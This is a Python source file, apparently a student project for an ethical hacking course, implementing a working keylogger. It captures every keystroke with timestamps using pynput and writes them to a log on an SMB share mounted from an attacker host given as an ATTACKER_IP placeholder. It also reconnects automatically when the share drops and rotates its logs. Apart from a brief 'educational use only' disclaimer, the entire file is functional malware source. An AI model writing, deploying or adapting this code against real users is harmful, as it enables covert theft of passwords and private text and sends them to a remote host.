"""
keylogger.py — CSCI369 Ethical Hacking Project
Educational use only. Run only in controlled lab environments with authorization.

Improvements over v1:
  - Timestamps on every keystroke
  - Human-readable special key names
  - Session START / STOP markers
  - Auto-reconnect if SMB share drops
  - Log rotation (5 MB cap, 3 backups)
  - Graceful error handling
"""

from pynput import keyboard
import os
import time
import subprocess
import logging
from logging.handlers import RotatingFileHandler
from datetime import datetime

# ── Configuration ────────────────────────────────────────────────────────────
MOUNT_POINT   = "/mnt/attacker_logs"
ATTACKER_IP   = "<ATTACKER_IP>"          # Replace before use
SHARE_NAME    = "logs"
LOG_FILE      = os.path.join(MOUNT_POINT, "keylog.txt")

MAX_LOG_BYTES = 5 * 1024 * 1024         # 5 MB per log file
BACKUP_COUNT  = 3                        # Keep 3 rotated backups
RECONNECT_INTERVAL = 10                  # Seconds between reconnect attempts

# ── Human-readable key map ────────────────────────────────────────────────────
KEY_NAMES = {
    "Key.space":     " SPACE ",
    "Key.enter":     "\n[ENTER]\n",
    "Key.backspace":  "[BKSP]",
    "Key.tab":        "[TAB]",
    "Key.shift":      "[SHIFT]",
    "Key.shift_r":    "[SHIFT]",
    "Key.ctrl_l":     "[CTRL]",
    "Key.ctrl_r":     "[CTRL]",
    "Key.alt_l":      "[ALT]",
    "Key.alt_r":      "[ALT]",
    "Key.caps_lock":  "[CAPS]",
    "Key.esc":        "[ESC]",
    "Key.delete":     "[DEL]",
    "Key.up":         "[↑]",
    "Key.down":       "[↓]",
    "Key.left":       "[←]",
    "Key.right":      "[→]",
}

# ── Logger setup ─────────────────────────────────────────────────────────────
def setup_logger():
    """Set up a rotating file logger that writes to the shared SMB mount."""
    logger = logging.getLogger("keylogger")
    logger.setLevel(logging.DEBUG)

    handler = RotatingFileHandler(
        LOG_FILE,
        maxBytes=MAX_LOG_BYTES,
        backupCount=BACKUP_COUNT,
        encoding="utf-8",
    )
    handler.setFormatter(logging.Formatter("%(message)s"))
    logger.addHandler(handler)
    return logger

# ── SMB mount helpers ─────────────────────────────────────────────────────────
def is_mounted() -> bool:
    """Return True if the SMB share is currently mounted."""
    return os.path.ismount(MOUNT_POINT)

def mount_share() -> bool:
    """Attempt to mount the attacker's SMB share. Return True on success."""
    try:
        os.makedirs(MOUNT_POINT, exist_ok=True)
        result = subprocess.run(
            [
                "sudo", "mount", "-t", "cifs",
                f"//{ATTACKER_IP}/{SHARE_NAME}",
                MOUNT_POINT,
                "-o", f"guest,uid={os.getuid()},gid={os.getgid()},file_mode=0777,dir_mode=0777",
            ],
            capture_output=True,
            timeout=15,
        )
        return result.returncode == 0
    except Exception:
        return False

def unmount_share():
    """Unmount the share silently (best-effort)."""
    subprocess.run(["sudo", "umount", MOUNT_POINT], capture_output=True)

def ensure_connected() -> bool:
    """Make sure the share is mounted; remount if necessary."""
    if is_mounted():
        return True
    print(f"[*] Share not mounted. Attempting to reconnect to //{ATTACKER_IP}/{SHARE_NAME} ...")
    unmount_share()
    success = mount_share()
    if success:
        print("[+] Reconnected successfully.")
    else:
        print(f"[-] Reconnect failed. Retrying in {RECONNECT_INTERVAL}s ...")
    return success

# ── Keylogger logic ───────────────────────────────────────────────────────────
logger = None   # Initialized after share is confirmed mounted

def log(text: str):
    """Write text to the rotating log; reconnect if the share dropped."""
    global logger
    try:
        if logger:
            logger.info(text)
    except Exception:
        # Share might have dropped mid-write — flag for reconnect
        pass

def format_key(key) -> str:
    """Convert a pynput key to a human-readable string."""
    try:
        return key.char   # Regular printable character
    except AttributeError:
        raw = str(key)
        return KEY_NAMES.get(raw, f"[{raw}]")

def on_press(key):
    """Callback for every keypress — appends timestamped entry to log."""
    char = format_key(key)
    timestamp = datetime.now().strftime("%H:%M:%S")
    log(f"[{timestamp}] {char}")

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    global logger

    print("[*] CSCI369 Keylogger — Educational use only")
    print(f"[*] Target share: //{ATTACKER_IP}/{SHARE_NAME}")

    # Wait until the share is available before starting
    while not ensure_connected():
        time.sleep(RECONNECT_INTERVAL)

    logger = setup_logger()

    session_start = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log(f"\n{'='*50}")
    log(f"SESSION STARTED: {session_start}")
    log(f"{'='*50}\n")

    print(f"[+] Logging to {LOG_FILE}")
    print("[*] Press Ctrl+C to stop.\n")

    try:
        with keyboard.Listener(on_press=on_press) as listener:
            while True:
                time.sleep(5)
                # Periodic health-check: reconnect if share dropped
                if not is_mounted():
                    print("[!] Share lost — attempting reconnect ...")
                    while not ensure_connected():
                        time.sleep(RECONNECT_INTERVAL)
                    # Re-attach handler to new mount
                    for h in logger.handlers[:]:
                        logger.removeHandler(h)
                        h.close()
                    logger = setup_logger()

    except KeyboardInterrupt:
        session_end = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log(f"\n{'='*50}")
        log(f"SESSION ENDED: {session_end}")
        log(f"{'='*50}\n")
        print(f"\n[*] Session ended at {session_end}. Log saved.")

if __name__ == "__main__":
    main()
